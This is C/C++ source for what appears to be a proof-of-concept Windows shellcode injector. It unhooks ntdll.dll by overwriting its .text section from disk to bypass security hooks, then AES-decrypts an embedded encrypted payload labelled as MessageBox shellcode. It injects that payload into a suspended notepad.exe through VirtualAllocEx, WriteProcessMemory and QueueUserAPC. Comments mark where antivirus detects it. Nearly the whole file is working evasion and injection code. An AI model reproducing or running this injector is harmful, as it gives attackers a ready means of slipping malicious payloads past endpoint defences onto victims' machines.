#include <stdio.h>
#include <windows.h>

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF



#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")



int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


typedef DWORD (WINAPI *NtCreateThreadExType)(
    HANDLE *phThreadHandle,
    DWORD DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE hProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    DWORD *pZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// Definition von NtCreateThreadExType
typedef DWORD (WINAPI *NtCreateThreadExType)(
    HANDLE *phThreadHandle,
    DWORD DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE hProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    DWORD *pZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);


// Deklaration und Initialisierung von pNtCreateThreadEx
NtCreateThreadExType pNtCreateThreadEx = nullptr;


DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength)
{
	HANDLE hThread = NULL;
	DWORD (WINAPI *pNtQueueApcThread)(HANDLE ThreadHandle, PVOID pApcRoutine, PVOID pParam1, PVOID pParam2, PVOID pParam3) = NULL;
	//DWORD (WINAPI *pNtCreateThreadEx)(HANDLE *phThreadHandle, DWORD DesiredAccess, PVOID ObjectAttributes, HANDLE hProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, DWORD *pZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) = NULL;
	//NtCreateThreadExType pNtCreateThreadEx = (NtCreateThreadExType)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	pNtCreateThreadEx = reinterpret_cast<NtCreateThreadExType>(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx"));

	void *pRtlFillMemory = NULL;

	// find NtQueueApcThread function
	pNtQueueApcThread = (unsigned long (__stdcall *)(void *,void *,void *,void *,void *))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueueApcThread");
	if(pNtQueueApcThread == NULL)
	{
		return 1;
	}

	HMODULE hModule = GetModuleHandle("ntdll.dll");
	// find NtCreateThreadEx function
	//pNtCreateThreadEx = (unsigned long (__stdcall *)(void ** ,unsigned long,void *,void *,void *,void *,unsigned long,unsigned long *,unsigned long,unsigned long,void *))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	pNtCreateThreadEx = reinterpret_cast<NtCreateThreadExType>(GetProcAddress(hModule, "NtCreateThreadEx"));
	if(pNtCreateThreadEx == NULL)
	{
		return 1;
	}

	// find RtlFillMemory function
	pRtlFillMemory = (void*)GetProcAddress(GetModuleHandle("kernel32.dll"), "RtlFillMemory");
	if(pRtlFillMemory == NULL)
	{
		return 1;
	}

	// create suspended thread (ExitThread)
	if(pNtCreateThreadEx(&hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, hProcess, (LPVOID)ExitThread, (LPVOID)0, NT_CREATE_THREAD_EX_SUSPENDED, NULL, 0, 0, NULL) != 0)
	{
		return 1;
	}

	// write memory
	for(DWORD i = 0; i < dwLength; i++)
	{
		// schedule a call to RtlFillMemory to update the current byte
		if(pNtQueueApcThread(hThread, pRtlFillMemory, (void*)((BYTE*)pAddress + i), (void*)1, (void*)*(BYTE*)(pData + i)) != 0)
		{
			// error
			TerminateThread(hThread, 0);
			CloseHandle(hThread);
			return 1;
		}
	}

	// resume thread to execute queued APC calls
	ResumeThread(hThread);

	// wait for thread to exit
	WaitForSingleObject(hThread, INFINITE);

	// close thread handle
	CloseHandle(hThread);

	return 0;
}

int main()
{


	printf("PoC \n\n");
	
	
	
	
	
	
	printf("[+] Try to unhook ntdll.dll! Press a key\n"); getchar();
	
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
	
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		
		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}
	
	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
	
	printf("[+] Done unhook ntdll.dll! Press a key\n"); getchar();
	
	
	
	
	
	// MessageBox shellcode - 64-bit
	unsigned char payload[] = { 0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
	unsigned char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };
	unsigned int payload_len = sizeof(payload);
	
	
	
	
	
	
	// Create a 64-bit process:
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID my_payload_mem;
	//SIZE_T my_payload_len = sizeof(my_payload);
	LPCWSTR cmd;
	HANDLE hProcess, hThread;
	NTSTATUS status;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);


	printf("[+] Press a key to Create suspended process\n"); getchar();

	CreateProcessA(
	"C:\\Windows\\System32\\notepad.exe",
	NULL, NULL, NULL, false,
	CREATE_SUSPENDED, NULL, NULL, &si, &pi
	);
	WaitForSingleObject(pi.hProcess, 5000);
	hProcess = pi.hProcess;
	hThread = pi.hThread;
	
	
	printf("[+] Press a key to VirtualAllocEx\n"); getchar();
	

	// allocate a memory buffer for payload
	my_payload_mem = VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	
	printf("[+] Press a key to WriteProcessMem\n"); getchar();

	// HERE THE AV COMES INTO PLACE when decr. shellcode 
	WriteProcessMemory(hProcess, my_payload_mem, payload, payload_len, NULL);
	
	
	printf("[+] Press a key to QueueUserAPC\n"); getchar();
	
	
	//Sleep(30000);

	// inject into the suspended thread. HERE THE AV COMES INTO PLACE even if encrypted shellcode
	PTHREAD_START_ROUTINE apc_r = (PTHREAD_START_ROUTINE)my_payload_mem;
	QueueUserAPC((PAPCFUNC)apc_r, hThread, NULL);
	
	
	printf("[+] Press a key to resume Thread\n"); getchar();

	// resume to suspended thread
	ResumeThread(hThread);


	return 0;
}
